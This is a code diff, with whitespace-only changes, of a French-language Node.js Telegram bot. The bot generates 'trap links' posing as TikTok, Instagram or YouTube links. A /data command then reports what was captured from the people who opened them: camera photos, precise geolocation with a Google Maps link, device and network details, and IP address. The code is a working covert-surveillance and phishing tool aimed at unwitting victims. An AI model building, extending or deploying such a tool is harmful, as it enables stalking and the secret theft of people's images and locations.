@@ -77,7 +77,7 @@ bot.onText(/\/help/, (msg) => {
 // 🎯 GÉNÉRATION DE LIENS
 bot.onText(/\/generate/, (msg) => {
     const chatId = msg.chat.id;
-    
+
     const keyboard = {
         reply_markup: {
             inline_keyboard: [
@@ -92,7 +92,7 @@ bot.onText(/\/generate/, (msg) => {
         },
         parse_mode: "Markdown"
     };
-    
+
     bot.sendMessage(chatId, "🎯 **Choisis ta plateforme :**", keyboard);
 });
 
@@ -100,25 +100,25 @@ bot.onText(/\/generate/, (msg) => {
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const platform = query.data;
-    
+
     // Répondre immédiatement au callback pour éviter les timeouts
     bot.answerCallbackQuery(query.id).catch(() => {}); // Ignorer les erreurs silencieusement
-    
+
     try {
         // Générer le lien
         const response = await axios.post(`${BASE_URL}/generate-link`, {
             platform,
             chatId
         });
-        
+
         const { id, url } = response.data;
-        
+
         const platformEmojis = {
             tiktok: "🎵",
             instagram: "📸",
             youtube: "📺"
         };
-        
+
         const message = `${platformEmojis[platform]} **${platform.toUpperCase()} - Lien Généré !**
 
 🔗 **Lien piège :**
@@ -136,9 +136,9 @@ bot.on("callback_query", async (query) => {
 ⚡ **Statut :** Actif et prêt à capturer !`;
 
         bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
-        
+
         console.log(`🔗 Lien ${platform} généré: ${id} pour chat ${chatId}`);
-        
+
     } catch (error) {
         console.error("❌ Erreur génération lien:", error.message);
         bot.sendMessage(chatId, "❌ Erreur lors de la génération. Réessaye dans quelques secondes.");
@@ -149,14 +149,14 @@ bot.on("callback_query", async (query) => {
 bot.onText(/\/data (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const linkId = match[1].trim();
-    
+
     try {
         const response = await axios.get(`${BASE_URL}/get-data/${linkId}`);
         const data = response.data;
-        
+
         // Construire le message de résultats
         let message = `📊 **DONNÉES CAPTURÉES - ${linkId}**\n\n`;
-        
+
         // 📸 Photos
         if (data.images && data.images.length > 0) {
             message += `📸 **Photos :** ${data.images.length} images capturées\n`;
@@ -164,7 +164,7 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
         } else {
             message += `📸 **Photos :** Aucune image capturée\n\n`;
         }
-        
+
         // 📍 Localisation
         if (data.location && data.location.latitude) {
             message += `📍 **Géolocalisation :**\n`;
@@ -181,7 +181,7 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
         } else {
             message += `📍 **Géolocalisation :** Non disponible\n\n`;
         }
-        
+
         // 📱 Appareil
         if (data.device) {
             message += `📱 **Appareil :**\n`;
@@ -196,7 +196,7 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             }
             message += '\n';
         }
-        
+
         // 🌐 Réseau
         if (data.network && data.network.effectiveType) {
             message += `🌐 **Réseau :**\n`;
@@ -206,24 +206,24 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             }
             message += '\n';
         }
-        
+
         // ⏰ Timestamp
         message += `⏰ **Capturé le :** ${new Date(data.timestamp).toLocaleString('fr-FR')}\n`;
         message += `🌐 **IP :** ${data.ip || 'N/A'}`;
-        
+
         // Envoyer le message principal
         bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
-        
+
         // Envoyer la première photo si disponible
         if (data.images && data.images.length > 0) {
             try {
                 const imageBuffer = Buffer.from(data.images[0], 'base64');
-                await bot.sendPhoto(chatId, imageBuffer, { 
-                    caption: `📸 Photo 1/${data.images.length} capturée via ${linkId}` 
+                await bot.sendPhoto(chatId, imageBuffer, {
+                    caption: `📸 Photo 1/${data.images.length} capturée via ${linkId}`
                 });
-                
+
                 if (data.images.length > 1) {
-                    bot.sendMessage(chatId, 
+                    bot.sendMessage(chatId,
                         `📸 **${data.images.length - 1} autres photos disponibles !**\n\n` +
                         `Pour voir toutes les photos, utilise le panneau d'administration ou contacte le développeur.`,
                         { parse_mode: "Markdown" }
@@ -234,21 +234,21 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
                 bot.sendMessage(chatId, `📸 ${data.images.length} photos capturées (erreur d'affichage)`);
             }
         }
-        
+
         // Lien Google Maps si géolocalisation disponible
         if (data.location && data.location.latitude) {
             const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
-            bot.sendMessage(chatId, 
+            bot.sendMessage(chatId,
                 `🗺️ **[Voir sur Google Maps](${mapsUrl})**`,
                 { parse_mode: "Markdown", disable_web_page_preview: false }
             );
         }
-        
+
         console.log(`📊 Données consultées pour ${linkId} par chat ${chatId}`);
-        
+
     } catch (error) {
         if (error.response && error.response.status === 404) {
-            bot.sendMessage(chatId, 
+            bot.sendMessage(chatId,
                 `❌ **Aucune donnée trouvée pour l'ID :** \`${linkId}\`\n\n` +
                 `💡 **Vérifications :**\n` +
                 `• L'ID est-il correct ?\n` +
